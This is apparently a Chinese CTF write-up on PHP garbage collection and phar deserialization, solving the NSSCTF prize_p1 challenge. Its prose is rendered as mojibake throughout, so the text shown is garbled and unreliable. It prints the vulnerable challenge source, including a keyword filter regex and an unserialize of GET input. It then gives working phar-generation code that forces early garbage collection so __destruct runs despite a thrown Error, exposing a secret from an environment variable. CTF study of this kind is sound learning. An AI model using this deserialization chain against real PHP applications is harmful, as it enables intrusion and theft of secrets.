<h3 id="å›æ”¶å‘¨æœŸ"><a href="#å›æ”¶å‘¨æœŸ" class="headerlink" title="å›æ”¶å‘¨æœŸ"></a>å›æ”¶å‘¨æœŸ</h3><p>phpçš„åƒåœ¾å›æ”¶æœºåˆ¶æ˜¯é»˜è®¤æ‰“å¼€çš„ï¼Œåœ¨php.iniä¸­å¯ä»¥ä¿®æ”¹å®ƒ<code>zend.enable_gc</code>ï¼Œæˆ–è€…åœ¨è¿è¡Œphpæ—¶åˆ†åˆ«è°ƒç”¨gc_enable() å’Œ gc_disable()å‡½æ•°æ¥æ‰“å¼€å’Œå…³é—­åƒåœ¾å›æ”¶æœºåˆ¶ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/612b08fded7346268103c89b188ad14a.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p>
<p>é¦–å…ˆï¼Œéœ€è¦ç¡®ç«‹ä¸€äº›åŸºæœ¬è§„åˆ™ã€‚å¦‚æœ refcount <strong>å¢åŠ </strong>ï¼Œåˆ™è¯¥å˜é‡ä»åœ¨ä½¿ç”¨ä¸­ï¼Œå› æ­¤ä¸æ˜¯åƒåœ¾ã€‚å¦‚æœ refcount    <strong>å‡å°‘åˆ° 0</strong>ï¼Œåˆ™ zval å¯ä»¥é‡Šæ”¾ã€‚è¿™æ„å‘³ç€åªæœ‰å½“å¼•ç”¨è®¡æ•°å‚æ•°å‡å°‘åˆ°éé›¶å€¼æ—¶ï¼Œæ‰èƒ½åˆ›å»ºåƒåœ¾å¾ªç¯ã€‚å…¶æ¬¡ï¼Œåœ¨åƒåœ¾å¾ªç¯ä¸­ï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥æ˜¯å¦å¯ä»¥å°† refcount å‡å°‘ 1ï¼Œå¹¶æ£€æŸ¥å“ªäº›    zval çš„ refcount ä¸º 0 æ¥ç¡®å®šå“ªäº›éƒ¨åˆ†æ˜¯åƒåœ¾ã€‚</p>
<h2 id="GCæœºåˆ¶çš„å®é™…å·¥ä½œ"><a href="#GCæœºåˆ¶çš„å®é™…å·¥ä½œ" class="headerlink" title="GCæœºåˆ¶çš„å®é™…å·¥ä½œ"></a>GCæœºåˆ¶çš„å®é™…å·¥ä½œ</h2><p>é‚£ä¹ˆGCå›æ”¶æœºåˆ¶åœ¨ctfä¸­è¯¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿä¸Šé¢è¯´åˆ°PHPçš„é­”æœ¯æ–¹æ³•<code>__destruct()</code>å‡½æ•°åœ¨ç¨‹åºç»“æŸåä¼šè‡ªåŠ¨è°ƒç”¨<code>__destruct()</code>å‡½æ•°è¿›è¡Œè‡ªåŠ¨é”€æ¯ï¼Œä½†æ˜¯ç¨‹åºæŠ¥é”™æˆ–è€…å¼‚å¸¸ç»ˆæ­¢å°±ä¸ä¼šè§¦å‘è¯¥å‡½æ•°ã€‚</p>
<p>ä¸€æ®µä»£ç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">czy</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"æˆ‘æ˜¯__construct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"æˆ‘æ˜¯__destruct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç›´æ¥newä¸€ä¸ªå¯¹è±¡åˆ›å»ºç±»ï¼Œå¹¶æ²¡æœ‰è¿›è¡ŒæŒ‡å‘</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//ç¨‹åºè¿è¡Œç»“æŸåä¼šé”€æ¯æ‰€æœ‰å¯¹è±¡ï¼Œå°±ä¼šè§¦å‘__destruct();</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/96d1a112806f4e149dede4669e5697b4.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p>
<p>ä»è¿è¡Œçš„ç»“æœå¯ä»¥çœ‹åˆ°1å°±ç›´æ¥è§¦å‘<code>__destrcut()å‡½æ•°</code>è¢«å½“ä½œåƒåœ¾ç»™å›æ”¶äº†ã€‚è€Œ1å’Œ2åˆ™æ˜¯åœ¨åˆ›å»ºå®Œä¹‹åæ²¡æœ‰æ“ä½œäº†æ‰æ­£å¸¸ç»“æŸã€‚</p>
<p>é‚£ä¹ˆå¦‚æœæ­£å¸¸æŒ‡å‘ï¼Œç„¶ååé¢å†æŒ‡å‘å¯¹è±¡çš„æ—¶å€™å¿½ç„¶æŒ‡å‘å…¶ä»–çš„ï¼Œå°±æ˜¯èˆå¼ƒå¯¹è±¡ï¼Œé‚£ä¹ˆåˆä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>ä¸€æ®µä»£ç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">czy</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"æˆ‘æ˜¯__construct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"æˆ‘æ˜¯__destruct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//èˆå¼ƒå¯¹è±¡</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/10a042c5408c40bdb0b228566880b9f3.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"><br> å¯¹è±¡czyè¢«newäº†ä¹‹åå´è¢«èµ‹å€¼ä¸º4ï¼Œä¹Ÿå°±æ˜¯new czy(1)æ‰§è¡Œæ˜¯NULLï¼Œè§¦å‘<code>__destruct()</code>å½“æˆåƒåœ¾è¢«å›æ”¶ï¼Œä¹Ÿå°±æˆåŠŸæ‰§è¡Œäº†<code>__destruct()</code>é‡Œçš„è¯­å¥ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯ç”¨ç‚¹ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬æ³¨é‡Šæ‰<code>$c[0]=$c[1];//èˆå¼ƒå¯¹è±¡</code>ï¼š<br> <img src="https://img-blog.csdnimg.cn/f4192d1071814468b09e4daffcbf8377.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p>
<p>æ‹¿ç€å°±æ˜¯æ­£å¸¸åˆ›å»ºï¼Œæ­£å¸¸é”€æ¯ã€‚</p>
<h2 id="ç»“åˆé¢˜ç›®"><a href="#ç»“åˆé¢˜ç›®" class="headerlink" title="ç»“åˆé¢˜ç›®"></a>ç»“åˆé¢˜ç›®</h2><p>è¿™é‡Œæˆ‘é€‰äº†ä¸€ä¸ªæ¯”è¾ƒå…¸å‹çš„é¢˜ç›®<strong>NSSCTF prize_p1</strong><a href="https://www.ctfer.vip/problem/14">é¢˜ç›®åœ°å€</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>META</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$config</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./tmp/a.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"é‚£ä¹ˆå°±ä»è¿™é‡Œå¼€å§‹èµ·èˆªå§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flagåœ¨ç¯å¢ƒå˜é‡é‡Œã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"é‚£ä¹ˆå°±ä»è¿™é‡Œå¼€å§‹èµ·èˆªå§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ³¨æ„åˆ°è¿™é‡Œæ‰”å‡ºå¼‚å¸¸ï¼Œé‚£å°±æƒ³åˆ°ä»Šå¤©è®²çš„GCæœºåˆ¶äº†ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åœ¨é¢˜ç›®é‡Œä¹Ÿçœ‹åˆ°äº†</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./tmp/a.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ä»¥åŠ
<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span>
ä¸å…æƒ³åˆ°è¿™é‡Œä¼šä½¿ç”¨pharåè®®
pharååºåˆ—åŒ–åˆ©ç”¨æ¡ä»¶ï¼š
<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">></span>æœ‰æ–‡ä»¶æ“ä½œå‡½æ•°<span class="token punctuation">(</span>file_put_contentsç­‰ç­‰<span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token number">2</span><span class="token operator">></span>æœåŠ¡ç«¯æœ‰pharæ–‡ä»¶<span class="token punctuation">(</span>å’Œåç¼€åæ— å…³ï¼Œä¸»è¦æ˜¯æ ¼å¼ã€‚è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span>å‡½æ•°æ¥å†™å…¥æ–‡ä»¶<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¤§æ¦‚æ€è·¯å°±æ˜¯å…ˆå†™å…¥æ–‡ä»¶åˆ°&#x2F;tmp&#x2F;a.txtä¸­ï¼Œå†åˆ©ç”¨<strong>pharåè®®</strong>è§£æ&#x2F;tmp&#x2F;a.txtæ–‡ä»¶ï¼Œè§¦å‘<code>destruct()</code>è·å–ç¯å¢ƒå˜é‡ä¸­çš„flagã€‚ç»•è¿‡<code>throw new Error()</code>çš„æ–¹æ³•å°±æ˜¯è‡ªå·±è§¦å‘GCæœºåˆ¶ï¼Œæå‰è¿›å…¥<code>__destruct()</code>ã€‚</p>
<h3 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h3><p>è¦ç”Ÿæˆpharæ–‡ä»¶çš„è¯ï¼Œå¿…é¡»åœ¨php.iniæ–‡ä»¶ä¸­å°†phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚(è®¾ç½®æ—¶æ³¨æ„æŠŠå‰é¢åˆ†å·åˆ æ‰)<br> <img src="https://img-blog.csdnimg.cn/c2c224439fdc4c3ea5931ff326460616.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p>
<p>ç”Ÿæˆpharæ–‡ä»¶ä»£ç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
 
<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸ºphar</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xxx"</span><span class="token operator">.</span><span class="token string double-quoted-string">"xxx&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stub</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span>
<span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>pharæ–‡ä»¶æœ‰å››éƒ¨åˆ†ç»„æˆï¼š</p>
<blockquote>
<ol>
<li>a stub</li>
</ol>
<p>stubçš„åŸºæœ¬ç»“æ„ï¼š**<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>ï¼Œ**å‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥<code>__HALT_COMPILER();?&gt;</code>æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚</p>
<p>â€‹	2.a manifest describing the contents</p>
<p>Pharæ–‡ä»¶ä¸­è¢«å‹ç¼©çš„æ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯ï¼Œå…¶ä¸­Meta-dataéƒ¨åˆ†çš„ä¿¡æ¯ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å‚¨å­˜(å¯æ§)ï¼Œå½“é€šè¿‡phar:&#x2F;&#x2F;åè®®å¯¹pharæ–‡ä»¶è¿›è¡Œæ–‡ä»¶æ“ä½œæ—¶ï¼Œå°†ä¼šå¯¹pharæ–‡ä»¶ä¸­çš„Meta-dataè¿›è¡Œååºåˆ—åŒ–æ“ä½œè¿™é‡Œå°±æ˜¯æ¼æ´åˆ©ç”¨çš„å…³é”®ç‚¹ã€‚</p>
<p>â€‹	3. the file contents æ–‡ä»¶å†…å®¹</p>
<p>è¢«å‹ç¼©çš„æ–‡ä»¶å†…å®¹ï¼Œåœ¨æ²¡æœ‰ç‰¹æ®Šè¦æ±‚çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªè¢«å‹ç¼©çš„æ–‡ä»¶å†…å®¹å¯ä»¥éšä¾¿å†™çš„ï¼Œå› ä¸ºæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯ä¸ºäº†è§¦å‘å®ƒçš„ååºåˆ—åŒ–ã€‚</p>
<p>â€‹	4.signature ç­¾å</p>
<p>æ³¨æ„pharæ–‡ä»¶ä¸èƒ½ä»»æ„ä¿®æ”¹ï¼Œä¿®æ”¹ä¹‹åç”±äºç­¾åçš„å­˜åœ¨ï¼Œæ–‡ä»¶å°±ä¼šå¤±æ•ˆã€‚</p>
</blockquote>
<p>æŸ¥çœ‹ç”Ÿæˆçš„pharæ–‡ä»¶ï¼š</p>
<p>pharçš„ååºåˆ—åŒ–æ ‡ç­¾æ ¼å¼&#x3D;å˜é•¿å­—èŠ‚æ•£åˆ—å‡½æ•°å€¼+4å­—èŠ‚æ‰€ä½¿ç”¨æ•£åˆ—å‡½æ•°æ ‡ç­¾å+4å­—èŠ‚å›ºå®šæ ‡ç­¾GBMB</p>
<p><img src="https://img-blog.csdnimg.cn/21937b33f24b4b75951b683dd0bfadb9.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p>
<p>æ ¹æ®02 00 00 00å¯çŸ¥æ˜¯sha1è®¡ç®—ç­¾å<a href="https://www.php.net/manual/zh/phar.fileformat.signature.php">æ–‡ä»¶é“¾æ¥</a><br> <img src="https://img-blog.csdnimg.cn/745c261c5195453fa2060be5ee60029e.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p>
<p>å¥½äº†ï¼Œç°åœ¨æ ¹æ®é¢˜ç›®ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span><span class="token punctuation">&#123;</span>

<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"czy.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token comment">//è¿™é‡Œåç¼€å¿…é¡»ä¸ºphar</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                             <span class="token comment">//å¼€å§‹å†™å…¥å†…å®¹</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">//pharæ ‡è¯†</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setmetadata</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">=></span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">=></span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä¸Šé¢æ•°ç»„ä¸­ç¬¬ä¸€ä½æ˜¯$a,ç¬¬äºŒä½æ˜¯nullã€‚åºåˆ—åŒ–å†…å®¹ï¼Œè¿™é‡Œå†…éƒ¨ç›¸å½“äºè°ƒç”¨äº†serializeå‡½æ•°</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"czy.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"czy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token comment">//æ·»åŠ è¦ä¸€èµ·åŠ å…¥pharå½’æ¡£çš„æ–‡ä»¶ï¼ˆæ–‡ä»¶å+å†…å®¹ï¼‰</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                              <span class="token comment">//åœæ­¢å†™å…¥ï¼Œç­¾åè‡ªåŠ¨è®¡ç®—</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"æˆåŠŸç”Ÿæˆpharæ–‡ä»¶"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨è¿™é‡Œæ³¨æ„ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªç±»å…ˆèµ‹ç»™æ•°ç»„ï¼Œå†ä»¤èµ‹å€¼æ•°ç»„ä¸ºNULLï¼Œå®ƒå°±ä¼šå¤±å»å¼•ç”¨ä»è€Œè§¦å‘GCï¼Œè¾¾åˆ°ç»•è¿‡GCçš„ç›®çš„ã€‚</p>
